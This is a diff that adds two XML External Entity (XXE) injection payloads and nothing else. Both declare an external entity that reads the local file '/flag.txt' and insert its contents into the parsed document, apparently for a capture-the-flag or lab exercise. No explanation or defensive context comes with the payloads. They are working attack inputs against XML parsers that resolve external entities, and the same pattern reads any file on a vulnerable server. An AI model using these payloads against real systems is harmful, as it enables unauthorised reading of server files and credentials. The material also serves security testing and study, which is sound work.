@@ -1,0 +1,7 @@
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:/flag.txt'>]><root>&test;</root>
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "file:/flag.txt">
+]>
+<data>&file;</data>
